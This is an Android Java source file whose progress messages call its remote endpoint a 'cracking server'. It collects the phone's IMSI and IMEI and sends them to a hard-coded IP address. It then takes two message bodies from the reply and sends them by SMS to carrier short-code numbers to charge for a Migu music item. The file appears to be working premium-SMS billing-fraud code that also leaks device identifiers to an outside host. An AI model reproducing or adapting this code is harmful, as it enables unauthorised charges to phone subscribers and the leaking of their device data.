package com.apitest;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Looper;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Juletang2Execute
{
    private static final String SENT_SMS_MUSIC_REG = "SENT_SMS_Music_Reg";
    private static final String DELIVERED_SMS_MUSIC_REG = "DELIVERED_SMS_Music_Reg";
    private static final String TAG = "xcngame";

    /**
     * @param operationProgress 用于更新短信获取和发送的进度到UI
     * @param context
     */
    public static void charge_by_api(final OperationProgress operationProgress, final Context context)
    {
        operationProgress.reset();
        new Thread()
        {
            public void run()
            {
                try
                {
                    Looper.prepare();
                    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    String imsi = tm.getSubscriberId();
                    String imei = tm.getDeviceId();// String
                    //String iccid = "898602c0221670872200";
                    //600907000004806006
                    //String wd = "WD"+(System.currentTimeMillis()+"").substring(0,9);
                    String wd = "TLZS2"+(System.currentTimeMillis()+"").substring(0,9);
                    //String url = "http://218.94.146.154:8000/o/migu2api/45acce96c7445369f92b233697568b5fbb44f5ff/?channel_id=014A1N7&music_id=60067602750&music_type=1&excode=&imsi=" + imsi + "&imei=" + imei + "&cpparam=" + wd + "&is_consume=1";
                    String url = "http://218.94.146.154:8000/o/migu2api/1a4085ce18030d761ea7a453d891233ce294e259/?channel_id=014A1MY&music_id=60067602749&music_type=1&excode=&imsi=" + imsi + "&imei=" + imei + "&cpparam=" + wd + "&is_consume=1";

                    operationProgress.updateProgress("请求破解方时的使用的地址\r\n" + url + "\r\n\r\n");
                    String response = getUrl(url);
                    if (response == null)
                    {
                        operationProgress.updateProgress("破解服务器没有返回\r\n");
                        return;
                    }

                    line1 = line1.replace("\n", "");
                    line1 = line1.replace("\r", "");
                    line2= line2.replace("\n", "");
                    line2 = line2.replace("\r", "");

                    sendOneMessage(operationProgress, context, num1, line1);
                    sleep(10000);
                    sendOneMessage(operationProgress, context, num2, line2);
                }
                catch (Exception e)
                {
                    operationProgress.updateProgress("错误发生:" + e.getMessage());
                }
            }
        }.start();
    }

    private static void sendOneMessage(final OperationProgress operationProgress, Context context, final String num, final String line)
    {
        SmsManager smsManager = SmsManager.getDefault();
        BroadcastReceiver receiver1 = new BroadcastReceiver()
        {
            @Override
            synchronized public void onReceive(Context context, Intent intent)
            {
                Log.e(TAG, "send " + num + " ==" + line);
                operationProgress.updateProgress("\r\n已发送成功 \r\n");
            }
        };
        context.registerReceiver(receiver1, new IntentFilter(SENT_SMS_MUSIC_REG+num));
        Intent sentIntent = new Intent(SENT_SMS_MUSIC_REG+num);
        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent, 0);

        BroadcastReceiver receiver2 = new BroadcastReceiver()
        {
            @Override
            synchronized public void onReceive(Context context, Intent intent)
            {
                Log.e(TAG, "delivered " + num + " ==" + line);
                operationProgress.updateProgress("\r\n移动已收到短信 \r\n");
            }
        };
        context.registerReceiver(receiver2, new IntentFilter(DELIVERED_SMS_MUSIC_REG+num));
        Intent deliveredIntent = new Intent(DELIVERED_SMS_MUSIC_REG+num);
        PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, deliveredIntent, 0);

        smsManager.sendTextMessage(num, null, line, sentPI, deliveredPI);
        operationProgress.updateProgress("正在发送 \r\n" + line + "\r\n到 " + num + "\r\n");
    }

    static String line1;
    static String line2;
    static String num1 = "1065843601";
    static String num2 = "1065842232";

    public static String getUrl(String url) throws Exception
    {
        URL httpUrl = new URL(url);
        HttpURLConnection httpURLConnection = (HttpURLConnection) httpUrl.openConnection();
        httpURLConnection.setRequestMethod("GET");
        int responseCode = httpURLConnection.getResponseCode();

        if (responseCode != HttpURLConnection.HTTP_OK)
        {
            throw new Exception("服务器错误");
        }

        InputStream inputStream = httpURLConnection.getInputStream();
        Reader reader = new InputStreamReader(inputStream);
        BufferedReader bufferedReader = new BufferedReader(reader);

        StringBuilder stringBuilder = new StringBuilder();
        String line;
        line = bufferedReader.readLine();
        if (line != null)
        {
            stringBuilder.append(line);
            line1 = line;
        }
        else
        {
            return null;
        }
        line = bufferedReader.readLine();
        if (line != null)
        {
            stringBuilder.append(line);
            line2 = line;
        }
        else
        {
            return null;
        }
        return stringBuilder.toString();
    }
}
